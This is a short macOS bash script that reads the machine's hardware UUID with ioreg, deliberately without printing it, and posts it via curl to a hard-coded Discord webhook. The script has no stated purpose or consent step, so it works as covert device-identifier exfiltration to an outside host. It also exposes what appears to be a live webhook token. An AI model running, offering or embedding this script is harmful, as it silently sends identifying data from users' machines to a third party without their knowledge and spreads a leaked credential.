#!/bin/bash

# Get the system's UUID without printing it
UUID=$(ioreg -rd1 -c IOPlatformExpertDevice | grep IOPlatformUUID | awk -F\" '{print $4}')

# Set the webhook URL (replace with your actual webhook URL)
WEBHOOK_URL="https://discord.com/api/webhooks/1365829021325328474/mYai-fdwX2_K7lxZNZzut4DYtRsEEHBzjo1mb0QK4XPfBevl1u-x_hJ4-86nCSOGdr6R"

# Prepare the payload without printing UUID
payload="{\"content\": \"$UUID\"}"

# Send the POST request to the webhook
curl -X POST -H "Content-Type: application/json" -d "$payload" "$WEBHOOK_URL"
